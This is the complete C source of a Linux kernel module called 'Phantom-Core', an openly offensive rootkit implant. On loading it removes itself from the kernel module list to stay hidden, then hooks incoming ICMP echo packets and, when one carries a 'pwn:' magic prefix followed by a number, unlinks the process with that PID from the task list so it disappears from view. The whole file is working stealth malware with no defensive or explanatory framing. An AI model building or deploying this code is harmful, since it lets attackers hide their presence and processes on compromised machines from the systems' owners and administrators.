#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/string.h> 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("pwnxr");
MODULE_DESCRIPTION("Phantom-Core: Remote Command Execution");

#define MAGIC_PREFIX "pwn:"
#define MAGIC_LEN 4

static void hide_myself(void) {
    list_del(&THIS_MODULE->list);
}

static void hide_process_by_pid(int pid) {
    struct task_struct *task;
    struct task_struct *target_task = NULL;

    for_each_process(task) {
        if (task->pid == pid) {
            target_task = task;
            break;
        }
    }

    if (target_task) {
        list_del_init(&target_task->tasks);
        printk(KERN_INFO "Phantom-Core: COMMAND EXECUTED -> Hidden PID: %d\n", pid);
    }
}

static int parse_pid(char *data, int len) {
    int i;
    int pid = 0;
    for (i = MAGIC_LEN; i < len; i++) {
        if (data[i] >= '0' && data[i] <= '9') {
            pid = pid * 10 + (data[i] - '0');
        } else {
            break;
        }
    }
    return pid;
}

static struct nf_hook_ops my_nf_ops;

unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct icmphdr *icmp_header;
    unsigned char *payload;
    int payload_len;

    if (!skb) return NF_ACCEPT;

    ip_header = ip_hdr(skb);
    if (!ip_header) return NF_ACCEPT;

    if (ip_header->protocol == IPPROTO_ICMP) {
        icmp_header = (struct icmphdr *)((unsigned char *)ip_header + (ip_header->ihl * 4));

        if (icmp_header->type == ICMP_ECHO) {
            payload = (unsigned char *)icmp_header + sizeof(struct icmphdr);
            
            payload_len = skb->len - (ip_header->ihl * 4) - sizeof(struct icmphdr);

            if (payload_len >= MAGIC_LEN) {
                if (memcmp(payload, MAGIC_PREFIX, MAGIC_LEN) == 0) {
                    printk(KERN_INFO "Phantom-Core: Magic Packet Received!\n");
                    
                    int target_pid = parse_pid(payload, payload_len);
                    if (target_pid > 0) {
                        hide_process_by_pid(target_pid);
                    }
                }
            }
        }
    }

    return NF_ACCEPT;
}

static int __init implant_init(void)
{
    hide_myself();

    my_nf_ops.hook = hook_func;
    my_nf_ops.hooknum = NF_INET_PRE_ROUTING;
    my_nf_ops.pf = PF_INET;
    my_nf_ops.priority = NF_IP_PRI_FIRST;

    nf_register_net_hook(&init_net, &my_nf_ops);

    printk(KERN_INFO "Phantom-Core: Listening for commands...\n");
    return 0;
}

static void __exit implant_exit(void)
{
    nf_unregister_net_hook(&init_net, &my_nf_ops);
}

module_init(implant_init);
module_exit(implant_exit);